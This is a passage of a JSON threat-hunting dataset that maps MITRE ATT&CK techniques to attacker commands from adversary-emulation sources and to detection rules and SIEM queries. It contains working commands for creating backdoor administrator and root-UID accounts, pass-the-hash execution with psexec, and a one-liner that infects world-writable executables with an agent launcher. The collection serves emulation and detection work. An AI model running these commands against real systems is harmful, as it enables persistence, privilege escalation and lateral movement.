{"DestinationPort": 3389, "SourceAddress": ["127.*", "::1"]}, "condition": "selection and ( sourceRDP or destinationRDP )"}, "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "Suspicious RDP Redirect Using TSCON", "id": "f72aa3e8-49f9-4c7d-bd74-f8ab84ff9bbb", "status": "experimental", "description": "Detects a suspicious RDP session redirect using tscon.exe", "references": ["http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html", "https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6"], "tags": ["attack.lateral_movement", "attack.privilege_escalation", "attack.t1076", "car.2013-07-002"], "author": "Florian Roth", "date": "2018/03/17", "modified": "2018/12/11", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": "* /dest:rdp-tcp:*"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}]}, {"technique_id": "T1136", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Add backdoor user account:\nnet user support_388945a0 somepasswordhere /add /y\nnet localgroup administrators support_388945a0 /add\nnet localgroup \"remote desktop users\" support_388945a0 /add", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Add backdoor user account:\nshell net user support_388945a0 somepasswordhere /add /y\nshell net localgroup administrators support_388945a0 /add\nshell net localgroup \"remote desktop users\" support_388945a0 /add", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "post/windows/manage/add_user_domain", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Enable backdoor user account:\nnet user support_388945a0 /active:yes\nnet localgroup administrators support_388945a0 /add\nnet localgroup \"remote desktop users\" support_388945a0 /add", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Enable backdoor user account:\nshell net user support_388945a0 /active:yes\nshell net localgroup administrators support_388945a0 /add\nshell net localgroup \"remote desktop users\" support_388945a0 /add", "name": "Cobalt Strike"}, {"source": "atomics/T1136/T1136.yaml", "command": "useradd -M -N -r -s /bin/bash -c evil_account evil_user\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "dscl . -create /Users/evil_user\ndscl . -create /Users/evil_user UserShell /bin/bash\ndscl . -create /Users/evil_user RealName \"#{realname}\"\ndscl . -create /Users/evil_user UniqueID \"1010\"\ndscl . -create /Users/evil_user PrimaryGroupID 80\ndscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "dscl . -create /Users/#{username}\ndscl . -create /Users/#{username} UserShell /bin/bash\ndscl . -create /Users/#{username} RealName \"Evil Account\"\ndscl . -create /Users/#{username} UniqueID \"1010\"\ndscl . -create /Users/#{username} PrimaryGroupID 80\ndscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "net user /add \"T1136_CMD\" \"#{password}\"\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "net user /add \"#{username}\" \"T1136_CMD!\"\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "New-LocalUser -Name \"T1136_PowerShell\" -NoPassword\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter\necho \"#{password}\" | passwd --stdin butter\n", "name": null}, {"source": "atomics/T1136/T1136.yaml", "command": "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}\necho \"BetterWithButter\" | passwd --stdin #{username}\n", "name": null}, {"source": "Threat Hunting Tables", "command": "Net.exe user /add", "name": null}, {"source": "Threat Hunting Tables", "command": "Net.exe localgroup administrators * /add", "name": null}, {"source": "Threat Hunting Tables", "command": "Net.exe user * \\password \\domain", "name": null}, {"source": "Threat Hunting Tables", "command": "Net.exe dsadd user", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/add_netuser", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/add_netuser", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_useradd", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_useradd", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "useradd -M -N -r -s /bin/bash -c \"#{comment}\" #{username}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}", "name": null}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1136", "Built-in Windows Command": "Add backdoor user account:\nnet user support_388945a0 somepasswordhere /add /y\nnet localgroup administrators support_388945a0 /add\nnet localgroup \"remote desktop users\" support_388945a0 /add", "Cobalt Strike": "Add backdoor user account:\nshell net user support_388945a0 somepasswordhere /add /y\nshell net localgroup administrators support_388945a0 /add\nshell net localgroup \"remote desktop users\" support_388945a0 /add", "Metasploit": "post/windows/manage/add_user_domain", "Description": "Create a backdoor user account that often appears on windows systems and add that user to the local administrators group and the remote desktop users group. This combined with the sticky keys persistence grants an inocuous system level persistence mechanism."}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1136", "Built-in Windows Command": "Enable backdoor user account:\nnet user support_388945a0 /active:yes\nnet localgroup administrators support_388945a0 /add\nnet localgroup \"remote desktop users\" support_388945a0 /add", "Cobalt Strike": "Enable backdoor user account:\nshell net user support_388945a0 /active:yes\nshell net localgroup administrators support_388945a0 /add\nshell net localgroup \"remote desktop users\" support_388945a0 /add", "Metasploit": "", "Description": "If the support_388945a0 account already exists on the system, but is disabled, you can enable it and then add it to the necessary groups."}}, {"Atomic Red Team Test - Create Account": {"attack_technique": "T1136", "display_name": "Create Account", "atomic_tests": [{"name": "Create a user account on a Linux system", "description": "Create a user via useradd\n", "supported_platforms": ["linux"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "String", "default": "evil_user"}}, "executor": {"name": "bash", "elevation_required": true, "command": "useradd -M -N -r -s /bin/bash -c evil_account #{username}\n", "cleanup_command": "userdel #{username}\n"}}, {"name": "Create a user account on a MacOS system", "description": "Creates a user on a MacOS system with dscl\n", "supported_platforms": ["macos"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "String", "default": "evil_user"}, "realname": {"description": "'realname' to record when creating the user", "type": "String", "default": "Evil Account"}}, "executor": {"name": "bash", "elevation_required": true, "command": "dscl . -create /Users/#{username}\ndscl . -create /Users/#{username} UserShell /bin/bash\ndscl . -create /Users/#{username} RealName \"#{realname}\"\ndscl . -create /Users/#{username} UniqueID \"1010\"\ndscl . -create /Users/#{username} PrimaryGroupID 80\ndscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}\n", "cleanup_command": "dscl . -delete /Users/#{username}\n"}}, {"name": "Create a new user in a command prompt", "description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136_CMD\"\n", "supported_platforms": ["windows"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "String", "default": "T1136_CMD"}, "password": {"description": "Password of the user to create", "type": "String", "default": "T1136_CMD!"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "net user /add \"#{username}\" \"#{password}\"\n", "cleanup_command": "net user /del \"#{username}\" >nul 2>&1\n"}}, {"name": "Create a new user in PowerShell", "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136_PowerShell\"\n", "supported_platforms": ["windows"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "String", "default": "T1136_PowerShell"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "New-LocalUser -Name \"#{username}\" -NoPassword\n", "cleanup_command": "Remove-LocalUser -Name \"#{username}\" -ErrorAction Ignore\n"}}, {"name": "Create a new user in Linux with `root` UID and GID.", "description": "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n", "supported_platforms": ["linux"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "String", "default": "butter"}, "password": {"description": "Password of the user to create", "type": "String", "default": "BetterWithButter"}}, "executor": {"name": "bash", "elevation_required": true, "command": "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}\necho \"#{password}\" | passwd --stdin #{username}\n", "cleanup_command": "userdel #{username}\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100133", "os": "windows", "parent_process": "Net.exe", "commandline_string": "user /add", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "create_account", "mitre_attack": "T1136", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100134", "os": "windows", "parent_process": "Net.exe", "commandline_string": "localgroup administrators * /add", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "create_account", "mitre_attack": "T1136", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100135", "os": "windows", "parent_process": "Net.exe", "commandline_string": "user * \\password \\domain", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "create_account", "mitre_attack": "T1136", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100136", "os": "windows", "parent_process": "Net.exe", "commandline_string": "dsadd user", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "create_account", "mitre_attack": "T1136", "itw_sample": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/misc/add_netuser", "ATT&CK Technique #1": "T1136", "ATT&CK Technique #2": "", "Technique": "Create Account", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/add_netuser\":  [\"T1136\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/powerup/service_useradd", "ATT&CK Technique #1": "T1136", "ATT&CK Technique #2": "", "Technique": "Create Account", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/service_useradd\":  [\"T1136\"],"}}], "command_list": ["Add backdoor user account:\nnet user support_388945a0 somepasswordhere /add /y\nnet localgroup administrators support_388945a0 /add\nnet localgroup \"remote desktop users\" support_388945a0 /add", "Add backdoor user account:\nshell net user support_388945a0 somepasswordhere /add /y\nshell net localgroup administrators support_388945a0 /add\nshell net localgroup \"remote desktop users\" support_388945a0 /add", "post/windows/manage/add_user_domain", "Enable backdoor user account:\nnet user support_388945a0 /active:yes\nnet localgroup administrators support_388945a0 /add\nnet localgroup \"remote desktop users\" support_388945a0 /add", "Enable backdoor user account:\nshell net user support_388945a0 /active:yes\nshell net localgroup administrators support_388945a0 /add\nshell net localgroup \"remote desktop users\" support_388945a0 /add", "useradd -M -N -r -s /bin/bash -c evil_account evil_user\n", "dscl . -create /Users/evil_user\ndscl . -create /Users/evil_user UserShell /bin/bash\ndscl . -create /Users/evil_user RealName \"#{realname}\"\ndscl . -create /Users/evil_user UniqueID \"1010\"\ndscl . -create /Users/evil_user PrimaryGroupID 80\ndscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user\n", "dscl . -create /Users/#{username}\ndscl . -create /Users/#{username} UserShell /bin/bash\ndscl . -create /Users/#{username} RealName \"Evil Account\"\ndscl . -create /Users/#{username} UniqueID \"1010\"\ndscl . -create /Users/#{username} PrimaryGroupID 80\ndscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}\n", "net user /add \"T1136_CMD\" \"#{password}\"\n", "net user /add \"#{username}\" \"T1136_CMD!\"\n", "New-LocalUser -Name \"T1136_PowerShell\" -NoPassword\n", "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter\necho \"#{password}\" | passwd --stdin butter\n", "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}\necho \"BetterWithButter\" | passwd --stdin #{username}\n", "Net.exe user /add", "Net.exe localgroup administrators * /add", "Net.exe user * \\password \\domain", "Net.exe dsadd user", "powershell/persistence/misc/add_netuser", "powershell/persistence/misc/add_netuser", "powershell/privesc/powerup/service_useradd", "powershell/privesc/powerup/service_useradd", "useradd -M -N -r -s /bin/bash -c \"#{comment}\" #{username}", "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_command_line contains \"New-LocalUser\"or process_command_line contains \"net user add\")", "name": "Create Account"}, {"product": "Splunk", "query": "index=main  source=\"/var/log/secure\" eventtype=useradd | table user,host,src, UID, GID", "name": null}, {"product": "Splunk", "query": "index=linux source=\"/var/log/secure\" eventtype=userdel delete| table user,host", "name": null}, {"product": "Splunk", "query": "Root Account Creation: index=linux  source=\"/var/log/secure\" eventtype=useradd UID=0 OR GID=0", "name": null}], "possible_detections": [{"data_source": "/var/log/secure with \"useradd\"  and \"userdel\""}, {"data_source": {"title": "Detects local user creation", "id": "66b6be3d-55d0-4f47-9855-d69df21740ea", "description": "Detects local user creation on windows servers, which shouldn't happen in an Active Directory environment. Apply this Sigma Use Case on your windows server logs and not on your DC logs.", "status": "experimental", "tags": ["attack.persistence", "attack.t1136"], "references": ["https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/"], "author": "Patrick Bareiss", "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": 4720}, "condition": "selection"}, "fields": ["EventCode", "AccountName", "AccountDomain"], "falsepositives": ["Domain Controller Logs", "Local accounts managed by privileged account management tools"], "level": "low"}}]}, {"technique_id": "Lat. Mov. and Execution:", "commands": [], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "Lat. Mov. and Execution:", "Built-in Windows Command": "", "Cobalt Strike": "", "Metasploit": "", "Description": ""}}], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1077\nT1035", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "psexec is part of the SysInternals suite. It's not on systems by default, but it is likely to be a trusted executable, especially on sysadmin boxes where other SysInternals tools already exist:\n\npsexec /accepteula \\\\ip -u domain\\user -p password -c -f \\\\smbip\\share\\file.exe (Copy and execute file.exe on the remote system)\npsexec /accepteula \\\\ip -u domain\\user -p  lm:ntlm cmd.exe /c dir c:\\Progra~1 (Run cmd.exe on the remote system using the lm:ntlm password hash - aka pass the hash)\npsexec /accepteula \\\\ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "psexec COMP_NAME {listener name} (via sc)\npsexec_sh COMP_NAME {listener name} (via powershell)", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "PSEXEC Modules:\nexploit/windows/smb/psexec\nexploit/windows/local/current_user_psexec\nauxiliary/admin/smb/psexec_command\nauxiliary/scanner/smb/psexec_loggedin_users\nexploit/windows/smb/psexec_psh", "name": "Metasploit"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1077\nT1035", "Built-in Windows Command": "psexec is part of the SysInternals suite. It's not on systems by default, but it is likely to be a trusted executable, especially on sysadmin boxes where other SysInternals tools already exist:\n\npsexec /accepteula \\\\ip -u domain\\user -p password -c -f \\\\smbip\\share\\file.exe (Copy and execute file.exe on the remote system)\npsexec /accepteula \\\\ip -u domain\\user -p  lm:ntlm cmd.exe /c dir c:\\Progra~1 (Run cmd.exe on the remote system using the lm:ntlm password hash - aka pass the hash)\npsexec /accepteula \\\\ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)", "Cobalt Strike": "psexec COMP_NAME {listener name} (via sc)\npsexec_sh COMP_NAME {listener name} (via powershell)", "Metasploit": "PSEXEC Modules:\nexploit/windows/smb/psexec\nexploit/windows/local/current_user_psexec\nauxiliary/admin/smb/psexec_command\nauxiliary/scanner/smb/psexec_loggedin_users\nexploit/windows/smb/psexec_psh", "Description": "psexec copies over a file to the remote box via SMB, then creates a service (usually a randomly named one) which points to the binary that was just copied over, starts the service, then deletes the service. Depending on the version of psexec, it might also migrate out of the initial process and delete the file that was copied over too. This is very similar to the previously mentioned technique of creating a service remotely, but the operator has much less control over the parameters"}}], "command_list": ["psexec is part of the SysInternals suite. It's not on systems by default, but it is likely to be a trusted executable, especially on sysadmin boxes where other SysInternals tools already exist:\n\npsexec /accepteula \\\\ip -u domain\\user -p password -c -f \\\\smbip\\share\\file.exe (Copy and execute file.exe on the remote system)\npsexec /accepteula \\\\ip -u domain\\user -p  lm:ntlm cmd.exe /c dir c:\\Progra~1 (Run cmd.exe on the remote system using the lm:ntlm password hash - aka pass the hash)\npsexec /accepteula \\\\ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)", "psexec COMP_NAME {listener name} (via sc)\npsexec_sh COMP_NAME {listener name} (via powershell)", "PSEXEC Modules:\nexploit/windows/smb/psexec\nexploit/windows/local/current_user_psexec\nauxiliary/admin/smb/psexec_command\nauxiliary/scanner/smb/psexec_loggedin_users\nexploit/windows/smb/psexec_psh"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "Approved for Public Release; Distribution Unlimited. Case Number 17-3569. 2018 The MITRE Corporation. All Rights Reserved\n", "commands": [], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "Approved for Public Release; Distribution Unlimited. Case Number 17-3569. \u00a92018 The MITRE Corporation. All Rights Reserved\n", "Built-in Windows Command": "", "Cobalt Strike": "", "Metasploit": "", "Description": ""}}], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1044", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "exploit/windows/local/trusted_service_path", "name": "Metasploit"}, {"source": "atomics/T1044/T1044.yaml", "command": "Get-WmiObject win32_service | select PathName\nCopy-Item #{malicious_file} -Destination $env:TEMP\\T1044_weak_permission_file.txt -Force\n", "name": null}, {"source": "atomics/T1044/T1044.yaml", "command": "Get-WmiObject win32_service | select PathName\nCopy-Item $env:TEMP\\T1044\\T1044_malicious_file.txt -Destination #{weak_permission_file} -Force\n", "name": null}, {"source": "data/abilities/privilege-escalation/10681f2f-be03-44af-858d-f2b0812df185.yml", "command": {"darwin": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-darwin && sandcat.go-darwin\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payloads": ["sandcat.go"]}}, "linux": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-linux && sandcat.go-linux\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payloads": ["sandcat.go"]}}}, "name": "Locate and infect files with weak but executable perms"}, {"source": "Threat Hunting Tables", "command": "*.exe /grant Everyone:F /T /C /Q ", "name": null}, {"source": "Threat Hunting Tables", "command": "icacls.exe", "name": "sub_process_1"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/multi/SuidGuidSearch", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/multi/SuidGuidSearch", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/multi/WorldWriteableFileSearch", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/multi/WorldWriteableFileSearch", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1044", "Built-in Windows Command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "Cobalt Strike": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "Metasploit": "exploit/windows/local/trusted_service_path", "Description": "PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it."}}, {"Atomic Red Team Test - File System Permissions Weakness": {"attack_technique": "T1044", "display_name": "File System Permissions Weakness", "atomic_tests": [{"name": "File System Permissions Weakness", "description": "This test to show checking file system permissions weakness and which can lead to privilege escalation by replacing malicious file. Example; check weak file permission and then replace.\npowershell -c \"Get-WmiObject win32_service | select PathName\"   (check service file location) and\ncopy /Y C:\\temp\\payload.exe C:\\ProgramData\\folder\\Update\\weakpermissionfile.exe   ( replace weak permission file with malicious file )\n\nUpon execution, open the weak permission file at %temp%\\T1044_weak_permission_file.txt and verify that it's contents read \"T1044 Malicious file\". To verify\nthe weak file permissions, open File Explorer to%temp%\\T1044_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.\n", "supported_platforms": ["windows"], "input_arguments": {"weak_permission_file": {"description": "check weak files permission", "type": "path", "default": "$env:TEMP\\T1044_weak_permission_file.txt"}, "malicious_file": {"description": "File to replace weak permission file with", "type": "path", "default": "$env:TEMP\\T1044\\T1044_malicious_file.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "A file must exist on disk at specified location (#{weak_permission_file})\n", "prereq_command": "if (Test-Path #{weak_permission_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item #{weak_permission_file} -Force | Out-Null\nSet-Content -Path #{weak_permission_file} -Value \"T1044 Weak permission file\"\n"}, {"description": "A file to replace the original weak_permission_file. In an attack this would be the malicious file gaining extra privileges\n", "prereq_command": "if (Test-Path #{malicious_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory -Path $env:TEMP\\T1044\\ -Force | Out-Null\nNew-Item #{malicious_file} -Force | Out-Null\nSet-Content -Path #{malicious_file} -Value \"T1044 Malicious file\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Get-WmiObject win32_service | select PathName\nCopy-Item #{malicious_file} -Destination #{weak_permission_file} -Force\n", "cleanup_command": "Remove-Item #{weak_permission_file} -Force -ErrorAction Ignore\nRemove-Item -Recurse (Split-Path #{malicious_file}) -Force -ErrorAction Ignore\n"}}]}}, {"Mitre Stockpile - Locate and infect files with weak but executable perms": {"id": "10681f2f-be03-44af-858d-f2b0812df185", "name": "Weak executable files", "description": "Locate and infect files with weak but executable perms", "tactic": "privilege-escalation", "technique": {"attack_id": "T1044", "name": "File System Permissions Weakness"}, "platforms": {"darwin": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-darwin && sandcat.go-darwin\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payloads": ["sandcat.go"]}}, "linux": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-linux && sandcat.go-linux\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payloads": ["sandcat.go"]}}}}}, {"Threat Hunting Tables": {"chain_id": "100125", "os": "windows", "parent_process": "*.exe", "commandline_string": "/grant Everyone:F /T /C /Q ", "sub_process_1": "icacls.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "file_systems_permissions_weakness", "mitre_attack": "T1044", "itw_sample": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/host/multi/SuidGuidSearch", "ATT&CK Technique #1": "T1044", "ATT&CK Technique #2": "", "Technique": "File System Permissions Weakness", "Concatenate for Python Dictionary": "\"python/situational_awareness/host/multi/SuidGuidSearch\":  [\"T1044\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/host/multi/WorldWriteableFileSearch", "ATT&CK Technique #1": "T1044", "ATT&CK Technique #2": "", "Technique": "File System Permissions Weakness", "Concatenate for Python Dictionary": "\"python/situational_awareness/host/multi/WorldWriteableFileSearch\":  [\"T1044\"],"}}], "command_list": ["Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "exploit/windows/local/trusted_service_path", "Get-WmiObject win32_service | select PathName\nCopy-Item #{malicious_file} -Destination $env:TEMP\\T1044_weak_permission_file.txt -Force\n", "Get-WmiObject win32_service | select PathName\nCopy-Item $env:TEMP\\T1044\\T1044_malicious_file.txt -Destination #{weak_permission_file} -Force\n", {"darwin": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-darwin && sandcat.go-darwin\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payloads": ["sandcat.go"]}}, "linux": {"sh": {"command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-linux && sandcat.go-linux\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"\n", "payloads": ["sandcat.go"]}}}, "*.exe /grant Everyone:F /T /C /Q ", "icacls.exe", "python/situational_awareness/host/multi/SuidGuidSearch", "python/situational_awareness/host/multi/SuidGuidSearch", "python/situational_awareness/host/multi/WorldWriteableFileSearch", "python/situational_awareness/host/multi/WorldWriteableFileSearch"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 7 and (module_loaded contains \"\\\\Temp\\\\\"or module_loaded contains \"C:\\\\Users\\\\\"or driver_signature_status !contains \"Valid\")", "name": "File System Permissions Weakness"}], "possible_detections": []}, {"technique_id": "T1034", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "exploit/windows/local/trusted_service_path", "name": "Metasploit"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/allchecks", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/allchecks", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1034", "Built-in Windows Command": "Check for common privilege escalation methods:\n*upload PowerUp.ps1 to victim disk*\npowershell.exe -epbypass PowerUp.ps1\nInvoke-AllChecks", "Cobalt Strike": "powershell-import /path/to/PowerUp.ps1\npowershell Invoke-AllChecks", "Metasploit": "exploit/windows/local/trusted_service_path", "Description": "PowerUp.ps1 is a powershell script from the PowerSploit project on github by PowershellMafia. The Invoke-AllChecks commandlet checks for many common privilege escalation options such as unquoted service paths, writeable service directories, service information manipulation, always install elevated, etc. Each specific kind of escalation technique supplies its own method of abusing it."}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/powerup/allchecks", "ATT&CK Technique #1": "T1034", "ATT&CK Technique 